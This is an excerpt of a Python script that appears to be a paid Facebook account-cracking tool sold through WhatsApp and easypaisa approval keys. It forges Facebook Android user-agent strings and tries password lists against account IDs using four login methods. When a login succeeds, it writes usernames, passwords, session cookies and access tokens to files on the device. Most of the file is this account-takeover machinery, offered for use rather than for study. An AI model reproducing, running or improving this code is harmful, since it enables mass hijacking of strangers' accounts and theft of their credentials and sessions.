# This script is written by Haadi 03347283126
...
def iAmMethod2Ua():
	...
	ua = "Dalvik/2.1.0 (Linux; U; Android {random.randint(6,13)}; {sm} Build/TP1A.220{random.randint(620,650)}.014) [FBAN/FB4A;FBAV/189.0.0.35.93;FBBV/144693255;FBDM/{density=3.0,width=720,height=1440};FBLC/en_US;FBCR/Net10 Wireless;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G973F;FBSV/11.0;nullFBCA/armeabi-v7a:armeabi;]"
	return ua
##############_________#########
def iAmMethod100Ua():
        ...
        ua = ('[FBAN/FB4A;random/'+fbav+';FBBV/'+fbav+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/54104160;FBCR/SFR;FBMF/Samsung;FBBD/'+fbav+';FBPN/com.facebook.katana;FBDV/'+fbav+';FBAV/8.0;FBOP/1;FBCA/armeabi-v7l;]')
        return ua
#########____________#######
def iAmMethod20Ua():
...
def iAmMethod1Ua():
	...
	ua = random.choice(["Dalvik/1.6.0 (Linux; U; Android 7.0; A510FG Build/34.2.A.1.238) [FBAN/FB4A;random/'+fbav+';FBBV/'+fbav+';FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/52104160;FBCR/SFR;FBMF/Samsung;FBBD/'+fbav+';FBPN/com.facebook.katana;FBDV/'+fbav+';FBAV/7.0;FBOP/1;FBCA/armeabi-v7l;]",])
	return ua
...
def logo():
	sys.stdout.write('\x1b]2; Haadi:)\x07')
	os.system('clear')
	logo = (f'''\033[1;37m                                 
...
\033[1;37m ================================================
\033[92;1. NEW UPDATE DONE 1:00  M/3 UPDATED 
\033[1;37m ================================================
 [•] Owner    : Haadi
 [•] GitHub   : NO
 [•] Status   : PRIVATE
...
class iAmMain:
	...
	def iAmMenu(self):
		...
		p(" [\033[92;1m2\033[1;37m] Password change")
...
#####______________mtha1_________________##########
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Haadi] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					cok = f"sb={ssbb};{ckkk}"
					p('\r\033[1;92m[Haadi-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/Haadi_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/Haadi_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[Haadi-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Haadi_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
#####_____________method2_________#####
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Haadi] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;91m[Haadi-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Haadi_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
######___________________mthad3__________________#######
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Haadi] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[Haadi-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/Haadi_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/Haadi_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[Haadi-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Haadi_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
#######_________________Method4____________#########
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [Haadi] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/Haadi_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/Haadi_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[Haadi-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/Haadi_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
class automation:
	...
	def bulk_password(self):
		...
		sav = "/sdcard/Haadi_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "Haadi#786"
		logo()
...
Key = idd+id+xp
try:
    httpCaht = requests.get('https://github.com/haadi54/Test/blob/main/Haadi.txt').text
    if id in httpCaht:
      ...
      print(f"{W} YOUR KEY  :{W}  " +Key)
      line()
      print(f"{W} NOTE      :  WELCOME TO Haadi TOOL{W}")
      line()
      print(f"{W} TOOL IS PAID YOU HAVE TO\n PAY FOR APPROVAL")
      line()
      print(f" {W}For Pakistan ==={W }easypaisa : {W}03470156762")
      print(f" {W}Rs.350 For 15 Days")
      print(f" {W}Rs.600 For 1 Month")
      print(f" {W}For Other Countries ==={W} NO : {W}AVAIL")
      print(f"  {W}3dollar$ For 15 Days")
      print(f"  {W}5dollar$ For 1 Month")
      print(f" {W}COPY YOUR KEY AND SEND FOR APPROVAL")
      input(f'{W} IF YOU WANT TO BUY THEN PRESS ENTER ')
      tks = ('Haadi%20%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+Key);os.system('am start https://wa.me/+923185903024?text='+tks),approval()
      time.sleep(1)
      approval()
except:
    sys.exit()
